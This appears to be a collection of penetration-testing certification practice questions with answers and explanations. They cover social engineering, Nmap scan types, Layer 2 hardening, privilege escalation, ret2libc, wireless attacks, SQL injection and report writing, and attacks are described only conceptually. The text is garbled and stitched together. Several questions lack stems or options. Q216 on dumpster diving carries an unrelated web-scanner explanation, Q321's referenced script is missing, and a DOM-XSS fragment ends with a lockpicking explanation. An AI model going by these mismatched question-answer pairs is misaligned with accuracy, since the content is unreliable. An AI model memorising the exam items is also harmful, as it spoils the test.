QUESTION 71

A potential customer is looking to test the security of its network. One of the customer’s primary concerns is the security awareness of its employees. Which type of test would you recommend that the company perform as part of the penetration test?

A.  Network testing 
B.  Wireless testing 
C.  Social engineering testing 
D.  Web application testing 

Correct Answer: C

Explination: The majority of compromises today start with some kind of social engineering attack. This could be a phone call, an email, a website, an SMS message, and so on. For this reason, it is important to test how your employees handle these types of situations. This type of test is often omitted from the scope of a penetration testing engagement mainly because it primarily involves testing people instead of the technology. In most cases, management does not agree with this type of approach. However, it is important to get a real-world view of the latest attack methods. The result of a social engineering test should be to assess the security awareness program so that you can enhance it. It should not be to identify individuals who fail the test. One of the tool is the Social-Engineer Toolkit (SET), created by Dave Kennedy. This is a great tool for performing social engineering testing campaigns.

QUESTION 75

Your company has an Internet-facing website that is critical to its daily business. Which type of penetration test would you prioritize?

A.  Wireless test 
B.  Network test 
C.  Web application test 
D.  Social engineering test 

Correct Answer: C

Explination: Web application testing focuses on testing for security weaknesses in a web application. These weaknesses can include misconfigurations, input validation issues, injection issues, and logic flaws. Because a web application is typically built on a web server with a back-end database, the testing scope would normally include the database as well. But it would focus on gaining access to that supporting database through the web application compromise. A great resource that we mentioned a number of times in this book is the Open Web Application Security Project.

QUESTION 82

You are hired to complete a penetration test. The customer gives you only a domain name and IP address as the target information. Which type of penetration test is the customer asking you to perform?

A.  Black-box test 
B.  Brown-box test 
C.  White-box test 
D.  Gray-box test 

Correct Answer: A

Explination: With a black-box penetration test, the tester is provided with only a very limited amount of information. For instance, the tester may only be provided the domain names and IP addresses that are in scope for a particular target. The idea of this type of limitation is to have the tester take the perspective of an external attacker. Typically, an attacker would first determine a target and then begin to gather information about the target, using public information, and gaining more and more information to use in attacks. The tester would not have prior knowledge of the targets’ organization and infrastructure. Another aspect of black-box testing is that sometimes the network support personnel of the target may not be given information about exactly when the test is taking place. This allows for a defense exercise to take place as well. It also eliminates the issue of a target preparing for the test and not giving a real-world view of how the security posture really looks.

QUESTION 122

An Nmap _________ scan is also known as a “half-open” scan because it doesn’t open a full TCP connection.

A.  TCP 
B.  SYN 
C.  FIN
D.  Ping

Correct Answer: B

Explination: An Nmap SYN scan sends a TCP SYN packet to the TCP port it is probing. This is also referred to as half-open scanning because it doesn’t open a full TCP connection. If the response is a SYN/ACK, this indicates that the port is in a listening state. If the response to the SYN packet is RST (reset), this indicates that the port is closed or not in a listening state. If the SYN probe does not receive any response, Nmap marks it as filtered because it was unable to determine if the port was open or closed.

D.  -sS 

Correct Answer: D

Explination: With an Nmap SYN scan, the tool sends a TCP SYN packet to the TCP port it is probing. This is also referred to as half-open scanning because it doesn’t open a full TCP connection. If the response is a SYN/ACK, this indicates that the port is actually in a listening state. If the response to the SYN packet is a RST (or reset), this indicates that the port is closed or not in a listening state. If the SYN probe does not receive any response, Nmap marks it as filtered because it was unable to determine if the port was open or closed.


QUESTION 126

Which of the following Nmap options would you use to perform a TCP connect scan?

A.  -sF

QUESTION 163

Which of the following best practices help protect against VLAN hopping and Layer 2 attacks?

A.  Administratively configure access ports as access ports so that users cannot negotiate a trunk; also disable the negotiation of trunking (that is, do not allow Dynamic Trunking Protocol [DTP]). 
B.  Limit the number of MAC addresses learned on a given port with the port security feature. 
C.  Control Spanning Tree to stop users or unknown devices from manipulating it. You can do so by using the BPDU Guard and Root Guard features. 
D.  All of these 

Correct Answer: D

Explination: The following are a few examples of best practices for securing your infrastructure, including Layer 2: Select an unused VLAN (other than VLAN 1) and use it as the native VLAN for all your trunks. Do not use this native VLAN for any of your enabled access ports. Avoid using VLAN 1 anywhere because it is a default. Administratively configure access ports as access ports so that users cannot negotiate a trunk; also disable the negotiation of trunking (that is, do not allow Dynamic Trunking Protocol [DTP]). Limit the number of MAC addresses learned on a given port with the port security feature. Control Spanning Tree to stop users or unknown devices from manipulating it. You can do so by using the BPDU Guard and Root Guard features. Turn off Cisco Discovery Protocol (CDP) on ports facing untrusted or unknown networks that do not require CDP for anything positive. (CDP operates at Layer 2 and may provide attackers information you would rather not disclose.) On a new switch, shut down all ports and assign them to a VLAN that is not used for anything else other than a parking lot. Then bring up the ports and assign correct VLANs as the ports are allocated and needed.

QUESTION 210

Which of the following functionalities can an attacker abuse to try to elevate privileges if the service is running under SYSTEM privileges?

A.  Unquoted service paths 
B.  Unquoted PowerShell scripts 
C.  Writable SYSTEM services using the GetSystemDirectory function 
D.  Cross-site scripting (XSS) 

Correct Answer: A

Explination: If an executable (application binary) is enclosed in quotation marks (““), Windows knows where to find it. On the contrary, if the path where the application binary is located doesn’t contain any quotation marks, Windows will try to locate it and execute it inside every folder of this path until it finds the executable file. An attacker can abuse this functionality to try to elevate privileges if the service is running under SYSTEM privileges. A service is vulnerable if the path to the executable has a space in the filename and the filename is not wrapped in quotation marks; exploitation requires write permissions to the path before the quotation mark.

QUESTION 214

Which of the following is not true about sticky bits?

A.  A restricted deletion flag, or sticky bit, is a single bit whose interpretation depends on the file type. 
B.  For directories, the sticky bit prevents unprivileged users from removing or renaming a file in the directory unless they own the file or the directory; this is called the restricted deletion flag for the directory, and is commonly found on world-writable directories such as /tmp. 
C.  If the sticky bit is set on a directory, files inside the directory cannot be renamed or removed by the owner of the file, the owner of the directory, or the superuser (even though the modes of the directory might allow such an operation). 
D.  For regular files on some older systems, the sticky bit saves the program's text image on the swap device so it will load more quickly when run. 

Correct Answer: C

Explination: As documented in the chmod man pages, the restricted deletion flag or sticky bit is a single bit whose interpretation depends on the file type. For directories, the sticky bit prevents unprivileged users from removing or renaming a file in the directory unless they own the file or the directory; this is called the restricted deletion flag for the directory, and it is commonly found on world-writable directories such as /tmp. For regular files on some older systems, the sticky bit saves the program’s text image on the swap device so it will load more quickly when run. If the sticky bit is set on a directory, files inside the directory may be renamed or removed only by the owner of the file, the owner of the directory, or the superuser (even though the modes of the directory might allow such an operation); on some systems, any user who can write to a file can also delete it. This feature was added to keep an ordinary user from deleting another user’s files from the /tmp directory.


QUESTION 215

Which of the following is a type of attack in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the executable memory of the process?

A.  Ret2libc 
B.  ASLR bypass 
C.  CPassword 
D.  Sticky-bit attack 

Correct Answer: A

Explination: In return-to-libc or ret2libc, attacks (the predecessor to return-oriented programming [ROP]), a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the executable memory of the process. This is done to potentially bypass the not-execute (NX) bit Linux feature and allow the attacker to execute arbitrary code. Operating systems that support non-executable stack help protect against code execution after a buffer overflow vulnerability is exploited. On the other hand, this cannot prevent a ret2libc attack because in this attack, only existing executable code is used. Another technique, called stack-smashing protection, can prevent or obstruct code execution exploitation since it can detect the corruption of the stack and may potentially “flush out” the compromised segment.


QUESTION 216

Which of the following involves an unauthorized individual searching and attempting to collect sensitive information from the trash?

A.  Piggybacking 
B.  Fence jumping 
C.  Dumpster diving 
D.  Lockpicking

Correct Answer: C

Explination: A web application scanner is meant to discover issues such as input validation and SQL injection. To identify these types of flaws, an automated scanner needs to actually input information into the fields it is testing. The input can be fake data or even malicious scripts. As this information is being input, it is likely to make its way into the database that is supporting the web application you are testing. Once the testing is complete, this information needs to be cleaned from the database.

QUESTION 262

What is the primary deliverable for a contracted penetration tester?

A.  Exploitation of the target system 
B.  Penetration testing report 
C.  Vulnerability scanning report 
D.  A list of compromised systems 

Correct Answer: B

Explination: For a third-party penetration tester who has been hired to perform a test for a customer, the report the tester creates is the final deliverable. It is proof of the work the tester performed and the findings that came from the effort. It is similar to having a home inspection: The inspector will likely spend hours around the house, checking in the attic, crawl space, and so on. At the end of the day, you as the homeowner will want to have a detailed report on the inspector’s findings so that you can address any issues found. If the inspector were to provide you with an incomplete report or a report containing false findings, you would not feel that you had gotten your money’s worth.


QUESTION 263

What is the best way to ensure that you do not have false positives listed in your final report?

A.  Validate all findings 
B.  Export the vulnerability report 
C.  Run an Nmap scan of each device 
D.  Use only automated scanning tools 

Correct Answer: A

Explination: Let’s say you note in your report that there is an SQL injection flaw in one of the input fields of the application, and you do not validate the finding. Typically, you turn over your report to management, who then tasks the application developer with addressing the issue. It is the application developer’s job to fix this defect as soon as possible. He or she is likely to commit time to researching and mitigating the issue. If after spending time and money on hunting down the cause of this flaw, it is determined to be a false positive, you can expect that the application developer will be coming back to you, the tester, and it will likely be noted that you wasted the company’s resources.


QUESTION 264

What is the main concern with cutting and pasting the results directly from an automated vulnerability scan?

A.  Format of the text 
B.  Length of description 
C.  False positives 
D.  Copyright issues 

Correct Answer: C

Explination: As you work through the testing phases of a penetration test, you will use various tools. Some of these tools will have the capability to output a pretty report in various formats. This is a good feature for a tool to have. However, just because a tool has this capability does not mean that you should use it to export the findings of the tool and simply regurgitate it in your final report. There are almost always going to be false positives or false negatives in the results of any tool. For this reason, you must carefully review the results of a tool’s output and try to determine what the actual vulnerabilities mean to the actual target. You must take into consideration the business of the target to be able to determine the environment. From there, you will be able to compile a plan for how the findings should be prioritized and addressed.


QUESTION 265

When should you start to write a penetration testing report?

A.  After all testing is completed 
B.  Before the scope is completed 
C.  While testing is being performed 
D.  Before all testing is completed 

Correct Answer: C

Explination: This is a common question when it comes to data collection and report writing: Exactly when should I start putting together this information? A report is the final outcome of a penetration testing effort. The most accurate and comprehensive way to compile a report is to start collecting and organizing the results while you are still testing. During the testing phase, as you come across findings that need to be documented, take screenshots of the tools used, the steps, and the output. This will help you piece together exactly the scenario that triggered the finding and illustrate it for the end user. You should include these screenshots as part of the report because including visual proof is the best way for your audience to gain a full picture of and understand the findings. Sometimes it may even be necessary to create a video. In summary, taking screenshots, videos, and lots of notes will help you create a deliverable report. There are some great tools available to help you with this.


QUESTION 266

A system under test is determined to be running an insecure protocol. What severity level would you give this finding if the device were connected to the Internet?

A.  Medium 
B.  High 
C.  Low 
D.  None 

Correct Answer: B

Explination: If an insecure protocol is exposed to the Internet, the finding would need to be classified with a high severity level. It is very important to analyze the results of your testing and correlate them to the actual environment because doing so is the only way to really understand the risk. You need to then convey your understanding in your written report. Most reports provide an indication of risk as high, medium, or low. A quality report will provide an accurate rating based on the risk to the actual environment.


QUESTION 267

Which tool included in Kali is most helpful in compiling a quality penetration testing report?

A.  Nmap 
B.  Metasploit 
C.  Dradis 
D.  SET 

Correct Answer: C

Explination: When it comes to compiling a final penetration testing report, one of the biggest challenges is pulling together all the data and findings collected throughout the testing phases. This is especially true when the penetration test spans a long period of time. Very often, you will need to dig through the output of many tools to find the information you are looking to include in your report. This is where a tool like Dradis comes in. Dradis is a handy little tool that can ingest the results from many of the penetration testing tools you use and then help you compile and output reports in formats such as CSV, HTML, and PDF. It is very flexible because it includes many add-ons and also allows you to create your own. So if you need the ability to import from a new tool that is not yet compatible, you can simply write your own add-on to accomplish this.

The ____________ is a document that specifies the activities to be performed during a penetration testing engagement.

A.  NDA 
B.  rules of engagement document 
C.  SOW 
D.  MSA 

Correct Answer: C

Explination: The statement of work (SOW) is a document that specifies the activities to be performed during a penetration testing engagement. The SOW can be a standalone document or can be part of a master service agreement (MSA). The SOW can be used to define some of the following elements: Project (penetration testing) timelines, including the report delivery schedule, The scope of the work to be performed, The location of the work, Special technical and nontechnical requirements, Payment schedule, Miscellaneous items that may not be part of the main negotiation but that need to be listed and tracked because they could pose problems during the overall engagement.


QUESTION 277

The _____________ document is a type of contract that can be used to quickly negotiate the work to be performed.

A.  SOW 
B. MSS
C. MSA
D. NDA

Correct Answer: C

Explination: Master service agreements (MSAs) are very popular today. MSAs are contracts that can be used to quickly negotiate the work to be performed. Having a "master agreement" means that the same terms do not have to be renegotiated every time you perform work for a customer. MSAs are beneficial when you perform a penetration test and you know that you will be rehired on a recurring basis to perform additional tests in other areas of the company or to verify that the security posture of the organization has been improved as a result of prior testing and remediation.


QUESTION 278

Which of the following is a term used to describe an organization that is willing to accept the level of risk associated with a given activity or process?

A.  Risk avoidance 
B.  Risk tolerance or tolerance to impact 
C.  Risk acceptance 
D.  Risk taking 

Correct Answer: C

Explination: Risk acceptance indicates that an organization is willing to accept the level of risk associated with a given activity or process. Generally, but not always, this means that the outcome of the risk assessment is within tolerance. There may be times when the risk level is not within tolerance, but the organization will still choose to accept the risk because all other alternatives are unacceptable. Exceptions should always be brought to the attention of management and authorized by either the executive management or the board of directors. Risk tolerance is how much of the undesirable outcome the risk taker is willing to accept in exchange for the potential benefit. Inherently, risk is neither good nor bad. All human activity carries some risk, although the amount varies greatly. Consider this: Every time you get in a car, you are risking injury or even death. You manage the risk by keeping your car in good working order, wearing a seat beat, obeying the rules of the road, not texting, not being impaired, and paying attention. Your risk tolerance is that the reward for reaching your destination outweighs the potential harm. Risk taking can be beneficial and is often necessary for advancement. For example, entrepreneurial risk taking can pay off in innovation and progress. Ceasing to take risks would quickly wipe out experimentation, innovation, challenge, excitement, and motivation. Risk taking can, however, be detrimental when it is considered or influenced by ignorance, ideology, dysfunction, greed, or revenge. The key is to balance risk against rewards by making informed decisions and then managing the risk commensurate with organizational objectives.


QUESTION 279

Which of the following is true about scope creep?

A.  Scope creep does not always start as a bad situation 
B.  You may encounter scope creep when there is poor communication among stakeholders. 
C.  You may encounter scope creep when there is poor change management in the penetration testing engagement. 
D.  All of the answers are correct. 

Correct Answer: D

Explination: You may encounter a scope creep situation when there is poor change management in the penetration testing engagement. You may also encounter scope creep when there is ineffective identification of what technical and non-technical elements will be required for the penetration test or poor communication among stakeholders. Scope creep does not always start as a bad situation. For example, if your client is satisfied with the work you are doing in your engagement then the client may request additional testing or technical work to be performed. This is why change management and clear communication are crucial for avoiding a very uncomfortable and bad situation.


QUESTION 280

Which of the following is a type of assessment in which the company and the penetration tester agree on a specific goal or outcome?

A.  SOW-based assessment 
B.  Goals-based assessment 
C.  Compliance-based assessment 
D.  All of the answers are correct. 

Correct Answer: B

Explination: In a goals-based assessment, the company and the penetration tester agree on a specific goal or outcome. For example, a penetration tester might be hired to demonstrate how a threat actor could steal information from a specific system or application. It is important to make the scope very narrow and precise. Another example is that a penetration tester might be hired to perform a physical penetration assessment, along with social engineering limited to only one office location, and test the effectiveness of its physical security controls. In a compliance-based assessment, the penetration tester is hired to verify and audit the security posture of the organization and to make sure the organization is compliant with specific regulations.

QUESTION 308

Which of the following attacks is typically performed using the Object Exchange (OBEX) protocol?

A.  KARMA attack 
B.  Bluejacking 
C.  KRACK attack 
D.  None of these answers are correct. 

Correct Answer: B

Explination: Bluejacking is an attack that can be performed using Bluetooth with vulnerable devices in range. An attacker sends unsolicited messages to the victim over Bluetooth, including a contact card (vCard) that typically contains a message in the name field. This is done using the Object Exchange (OBEX) protocol. A vCard can contain name, address, telephone numbers, email addresses, and related web URLs. This type of attack has been mostly performed as a form of spam over Bluetooth connections.


QUESTION 309

Often a PIN that is used to provision the wireless device is printed on the outside of a wireless device or in the box that came with it. What protocol uses this PIN and can be easily defeated by an attacker to compromise a wireless infrastructure device?

A.  WEP 
B.  WPA 
C.  WPS 
D.  None of these answers are correct. 

Correct Answer: C

Explination: Wi-Fi Protected Setup (WPS) is a protocol that simplifies the deployment of wireless networks. It is used so that users can simply generate a WPA PSK with little interaction with the wireless device. Typically, a PIN printed on the outside of the wireless device or in the box that came with it is used to provision the wireless device. Most implementations do not care if you incorrectly attempt millions of PIN combinations in a row, which means these devices are susceptible to brute-force attacks.


QUESTION 310

Which of the following attacks generates random noise on the frequencies that wireless networks use in order to perform a denial-of-service condition?

A.  KARMA attack 
B.  PNL attack 
C.  Jamming attack 
D.  War driving attack 

Correct Answer: C

Explination: The purpose of jamming wireless signals or causing wireless network interference is to create a full or partial DoS condition in the wireless network. Such a condition, if successful, is very disruptive. Most modern wireless implementations provide built-in features that can help immediately detect such attacks. In order to jam a Wi-Fi signal or any other type of radio communication, an attacker basically generates random noise on the frequencies that wireless networks use. With the appropriate tools and wireless adapters that support packet injection, an attacker can cause legitimate clients to disconnect from wireless infrastructure devices.

C.  Ultra-high-frequency (UHF) RFID tags and devices operate at frequencies between 860MHz and 960MHz (regional) and exchange information at distances of up to 30 feet. 
D.  All of these answers are correct. 

Correct Answer: D

Explination: Low-frequency (LF) RFID tags and devices operate at frequencies between 120kHz and 140kHz, and they exchange information at distances shorter than 3 feet. High-frequency (HF) RFID tags and devices operate at the 13.56MHz frequency and exchange information at distances between 3 and 10 feet. Ultra-high-frequency (UHF) RFID tags and devices operate at frequencies between 860MHz and 960MHz (regional) and exchange information at distances of up to 30 feet. RFID tags can be tampered by implanting skimmers behind RFID card readers in a building or a room.


QUESTION 312

In which of the following wireless attacks does the attacker typically use DNS spoofing to redirect the victim to a cloned captive portal or a website?

A.  KARMA attack 
B.  Evil twin 
C.  DNSmasq 
D.  None of these answers are correct. 

Correct Answer: B

Explination: In an evil twin attack, the attacker uses DNS spoofing to redirect the victim to a cloned captive portal or a website. When users are logged on to the evil twin, a hacker can easily inject a spoofed DNS record into the DNS cache, changing the DNS record for all users on the fake network. Any user who logs in to the evil twin will be redirected by the spoofed DNS record injected into the cache. An attacker who performs a DNS poisoning attack wants to get the DNS cache to accept a spoofed record.

QUESTION 315

Which of the following is a best practice or mitigation against web session hijacking?

A.  Change the default session ID name of the web development framework to a generic name, such as id. 
B.  Session IDs should be at least 128 bits (16 bytes). 
C.  You should use a good deterministic random bit generator (DRBG) to create a session ID value that provides at least 256 bits of entropy. 
D.  All of these answers are correct. 

Correct Answer: D

Explination: The session ID names used by the most common web application development frameworks can be easily fingerprinted. For instance, you can easily fingerprint PHPSESSID (PHP), JSESSIONID (J2EE), CFID and CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP .NET), and many others. In addition, the session ID name may indicate what framework and programming languages are used by the web application. It is recommended to change the default session ID name of the web development framework to a generic name, such as id. The session ID must be long enough to prevent brute-force attacks and web session hijacking. Sometimes developers set it to just a few bits, though it must be at least 128 bits (16 bytes). You should use a good deterministic random bit generator (DRBG) to create a session ID value that provides at least 256 bits of entropy.


QUESTION 316

Which of the following statements is correct regarding the importance of validating and filtering invalid session ID values?

A.  They can potentially be used to exploit other web vulnerabilities. 
B.  They can allow an attacker to exploit SQL injection vulnerabilities if the session IDs are stored on a relational database. 
C.  They can allow an attacker to exploit persistent cross-site scripting (XSS) vulnerabilities if the session IDs are stored and later reflected back by the web application. 
D.  All of these answers are correct. 

Correct Answer: D

Explination: If web applications do not validate and filter out invalid session ID values, they can potentially be used to exploit other web vulnerabilities, such as SQL injection if the session IDs are stored on a relational database or persistent cross-site scripting (XSS) if the session IDs are stored and later reflected back by the web application.

QUESTION 321

Refer to the following script: 
----------------------------
Server Error in '/' Application
----------------------------
What can you do with the error message displayed in this script?

A.  Fingerprint the database type. 
B.  Perform a SQL injection. 
C.  Perform a XSS attack. 
D.  Perform a CSRF attack. 

Correct Answer: A

Explination: In order to successfully execute complex queries and exploit different combinations of SQL injections, you must first fingerprint the database. The SQL language is defined in the ISO/IEC 9075 standard. However, databases differ from one another in terms of the ability to perform additional commands, using functions to retrieve data, and other features. When performing more advanced SQL injection attacks, an attacker needs to know what back-end database the application uses (for example, Oracle, MariaDB, MySQL, PostgreSQL). One of the easiest ways to fingerprint a database is to pay close attention to any errors returned by the application. The script shows an error message from a Microsoft SQL server with Active Server Page (ASP). You can find additional information about Microsoft SQL database error codes at https://docs.microsoft.com/en-us/azure/sql-database/sql-database-develop-error-messages.

A.  Static SQL queries 
B.  SQL injection 
C.  Parameterized SQL queries 
D.  Stored procedures 

Correct Answer: A

Explination: The script includes two examples of static SQL queries. Examples of mitigations against SQL injection vulnerabilities and related attacks include static queries, parameterized queries, and stored procedures (if they do not generate dynamic SQL).


QUESTION 323

In which of the following SQL injection types would the attacker obtain the data by using the same channel that is used to inject the SQL code?

A.  Blind 
B.  Out-of-band 
C.  In-band 
D.  All of these answers are correct. 

Correct Answer: C

Explination: Using in-band SQL injection, the attacker obtains data by using the same channel that is used to inject the SQL code. This is the most basic form of an SQL injection attack, where the data is dumped directly in a web application (or web page). Using out-of-band SQL injection, the attacker retrieves data using a different channel. For example: an email, a text, or an instant message could be sent to the attacker with the results of the query; or the attacker might be able to send the compromised data to another system. Using blind (or inferential) SQL injection, the attacker does not make the application display or transfer any data; rather, the attacker is able to reconstruct the information by sending specific statements and discerning the behavior of the application and database.

QUESTION 330

Which of the following is not an SQL injection technique?

A.  DOM-based XSS 
B.  Boolean 
C.  Union operators 
D.  Error-based technique 

Correct Answer: A

Explination: In a DOM-based XSS attack, the attacker sends a malicious URL to the victim and after the victim clicks on the link; it may load a malicious website or a site that has a vulnerable DOM route handler.     --------    Answers B, C, and D are incorrect. Union operators are typically used when a SQL injection vulnerability allows a SELECT statement to combine two queries into a single result or a set of results. The Boolean technique is used to verify whether certain conditions are true or false. The error-based technique is used to force the database to generate an error in order to enhance and refine an attack (injection). Out-of-band injection is typically used to obtain records from the database by using a different channel. For example, it is possible to make an HTTP connection to send the results to a different web server or a local machine running a web service. An attacker may use the time delay technique when he or she doesn't get any output or error messages from the application.


QUESTION 331

Which of the following statements is true about DOM-based XSS attacks?

A.  DOM-based attacks are typically reflected XSS attacks that are triggered by sending a link with inputs that are reflected to the web browser.

D.  None of these answers are correct. 

Correct Answer: D

Explination: The answer here would be lockpicking, which occurs when an unauthorized individual manipulates or tampers with a lock to enter a building or obtain access to anything that is protected by a lock. Lock bypass is a technique used in lockpicking. Locks may be bypassed in many ways, including by using techniques such as simple loading attempts (using a "credit card" or similar items against self-closing "latch" locks) and bypassing padlocks by shimming. With piggybacking/tailgating, an unauthorized individual follows an authorized individual to enter a restricted building or facility. With fence jumping, an unauthorized individual jumps a fence or a gate to enter a restricted building or facility. With dumpster diving, an unauthorized individual searches for and attempts to collect sensitive information from the trash.
